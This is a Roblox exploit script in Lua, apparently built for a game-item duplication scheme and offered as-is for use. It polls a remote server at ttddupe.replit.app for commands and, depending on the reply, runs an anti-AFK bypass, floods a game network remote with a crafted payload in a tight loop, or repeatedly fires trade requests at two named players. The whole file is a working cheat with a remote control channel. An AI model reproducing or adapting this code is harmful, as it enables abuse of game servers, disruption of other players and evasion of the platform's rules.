local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local httpRequest = request

local afkExecuted = false
local spamRunning = false
local tradeRunning = false
local tradeTargets = {}

local function afkScript()
	local gui = Instance.new("ScreenGui", game.CoreGui)
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	local label = Instance.new("TextLabel", gui)
	label.Size = UDim2.new(0, 370, 0, 52)
	label.Position = UDim2.new(0.5, -185, 0.1, 0)
	label.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	label.Font = Enum.Font.SourceSansSemibold
	label.Text = "Anti AFK Script Active"
	label.TextColor3 = Color3.new(0, 1, 1)
	label.TextSize = 22

	local vu = game:GetService("VirtualUser")
	Players.LocalPlayer.Idled:Connect(function()
		vu:CaptureController()
		vu:ClickButton2(Vector2.new())
		label.Text = "AFK blocked!"
		task.wait(2)
		label.Text = "Anti AFK Script Active"
	end)
end

local function startSpam()
	if spamRunning then return end
	spamRunning = true
	spawn(function()
		local args = {
			{
				{
					ReplicatedStorage.IdentifiersContainer.RE_b7b5d6eaedcdabca20ea87f1fd2b6ffc73fa913b3c748d69f838fd767b5f1ee6.Value,
					"\255"
				}
			}
		}
		while task.wait() do
			ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
		end
	end)
end

local function startTradeLoop(user1, user2)
	if tradeRunning then return end
	tradeRunning = true

	spawn(function()
		while task.wait(1) do
			for _, username in ipairs({user1, user2}) do
				if not tradeTargets[username] then
					Players.PlayerAdded:Connect(function(newPlayer)
						if newPlayer.Name == username then
							tradeTargets[username] = newPlayer
						end
					end)
					local existing = Players:FindFirstChild(username)
					if existing then
						tradeTargets[username] = existing
					end
				end
			end

			local p1 = tradeTargets[user1]
			local p2 = tradeTargets[user2]

			if p1 and p1.Parent and p2 and p2.Parent then
				local gui = LocalPlayer:FindFirstChild("PlayerGui") and LocalPlayer.PlayerGui:FindFirstChild("Trading")
				if gui and not gui.TradingFrame.Visible then
					local args = {
						{
							{
								ReplicatedStorage.IdentifiersContainer.RF_34fa16d44fc3ec71f2df15808f9b2487cb975eb93bfb49d822bba4a38945600f_S.Value,
								"\186\236PA\206\203M\248\128\4^\144\13&r/",
								p1
							}
						}
					}
					ReplicatedStorage.NetworkingContainer.DataRemote:FireServer(unpack(args))
				end
			end
		end
	end)
end

local function fetchInfo()
	local success, result = pcall(function()
		return httpRequest({
			Url = "https://ttddupe.replit.app/info",
			Method = "GET",
			Headers = {["Content-Type"] = "application/json"}
		})
	end)

	if not success or not result or not result.Body then return end

	local ok, data = pcall(function()
		return HttpService:JSONDecode(result.Body)
	end)

	if not ok then return end

	if data.afk and not afkExecuted then
		afkExecuted = true
		afkScript()
	end

	if data.spam then
		startSpam()
	end

	if data.trade and data.trade.user1 and data.trade.user2 then
		startTradeLoop(data.trade.user1, data.trade.user2)
	end
end

spawn(function()
	while task.wait(0.1) do
		pcall(fetchInfo)
	end
end)
